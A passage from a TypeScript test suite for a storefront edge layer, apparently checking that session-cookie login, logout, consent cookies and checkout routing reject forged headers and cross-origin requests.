    expect((await get(`${shop}/_p/account/login`, json, { method: "POST", body })).status).toBe(
      404,
    );
    expect(api.calls.length).toBe(calls);

    const login = await get(
      `${co}/_p/account/login`,
      {
        ...json,
        cookie: "__Host-cart=checkouttoken_000000000001",
        "x-forwarded-for": "198.51.100.1, 203.0.113.9",
        "x-customer-session": "forged_forged_forged_forged",
      },
      { method: "POST", body },
    );
    expect(login.status).toBe(200);
    expect(login.headers.get("set-cookie")).toBe(
      "__Host-sid=sessiontoken_000000000001; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000",
    );
    expect(login.headers.get("x-session-token")).toBeNull();
    expect(await login.text()).not.toContain("sessiontoken");
    const sent = api.calls.at(-1);
    expect(sent?.url).toBe("http://api.test/storefront/v1/customer/login");
    expect(sent?.headers).toMatchObject({
      "x-tenant": "t-demo",
      "x-cart-token": "checkouttoken_000000000001",
      "x-client-ip": "203.0.113.9",
    });
    expect(sent?.headers["x-customer-session"]).toBeUndefined(); // client headers never pass

    const cookie = "__Host-sid=sessiontoken_000000000001";
    const me = await get(`${co}/_p/account/me`, { cookie });
    expect(me.status).toBe(200);
    expect(api.calls.at(-1)?.headers["x-customer-session"]).toBe("sessiontoken_000000000001");
    expect(me.headers.get("set-cookie")).toContain("Max-Age=2592000"); // sliding
    const stale = await get(`${co}/_p/account/me`, {
      cookie: "__Host-sid=sessiontoken_000000000999",
    });
    expect(stale.status).toBe(401);
    expect(stale.headers.get("set-cookie")).toMatch(/^__Host-sid=; .*Max-Age=0$/);
    const out = await get(
      `${co}/_p/account/logout`,
      { ...json, cookie },
      { method: "POST", body: "{}" },
    );
    expect(out.status).toBe(204);
    expect(out.headers.get("set-cookie")).toMatch(/^__Host-sid=; .*Max-Age=0$/);

    // Server-rendered account pages get the session through the CHECKOUT binding context.
    api.calls.length = 0;
    const page = await get(`${co}/account`, { cookie });
    expect(await page.text()).toContain("session_seen");
    expect(
      api.calls.find((c) => c.url.endsWith("/customer/me"))?.headers["x-customer-session"],
    ).toBe("sessiontoken_000000000001");
    // Sign-in links do not leak through Referer.
    const verify = await get(`${co}/account/verify?token=${"a".repeat(64)}`);
    expect(verify.headers.get("referrer-policy")).toBe("no-referrer");
    expect(verify.headers.get("cache-control")).toBe("no-store");
  });

  test("consent: first-party cookies for the shop host after a choice only", async () => {
    const shop = "http://demo.localhost:8280";
    const json = { origin: shop, "content-type": "application/json" };
    const choice = JSON.stringify({ purposes: { analytics: true }, text_version: "2026-09-25" });
    expect(
      (
        await get(
          `${shop}/_p/consent`,
          { ...json, origin: "https://evil.example" },
          { method: "POST", body: choice },
        )
      ).status,
    ).toBe(403);
    const read = await get(`${shop}/_p/consent`);
    expect(read.headers.get("set-cookie")).toBeNull();
    const res = await get(
      `${shop}/_p/consent`,
      { ...json, "x-forwarded-for": "203.0.113.5", "x-consent-subject": "f".repeat(32) },
      { method: "POST", body: choice },
    );
    expect(res.status).toBe(200);
    const sent = api.calls.at(-1);
    expect(sent?.headers["x-consent-subject"]).toBeUndefined(); // only the cookie counts
    expect(sent?.headers["x-client-ip"]).toBe("203.0.113.5");
    const cookies = res.headers.getSetCookie();
    expect(cookies).toEqual([
      "__Secure-consent_id=0123456789abcdef0123456789abcdef; Domain=demo.localhost; Path=/; Secure; SameSite=Lax; Max-Age=34214400; HttpOnly",
      // The SDK's own format (granted purposes), so the banner and the edge write one cookie.
      "consent=analytics%2Cpersonalization; Domain=demo.localhost; Path=/; Secure; SameSite=Lax; Max-Age=15552000",
    ]);
    // The checkout origin (preferences page) shares the subject and adds the session.
    await get(
      "http://checkout.demo.localhost:8280/_p/consent",
      {
        origin: "http://checkout.demo.localhost:8280",
        "content-type": "application/json",
        cookie: `__Secure-consent_id=${"a".repeat(32)}; __Host-sid=sessiontoken_000000000001`,
      },
      { method: "POST", body: choice },
    );
    expect(api.calls.at(-1)?.headers).toMatchObject({
      "x-consent-subject": "a".repeat(32),
      "x-customer-session": "sessiontoken_000000000001",
    });
  });

  test("the checkout artifact comes from the resolved site", async () => {
    resolver.set(
      "sk.localhost",
      site({ shop_host: "sk.localhost", theme_artifact: v1, checkout_artifact: checkoutId }),
    );
    const res = await get("http://checkout.sk.localhost/");
    expect(res.status).toBe(200);
    expect(await res.text()).toContain("Pokladna");
  });
});
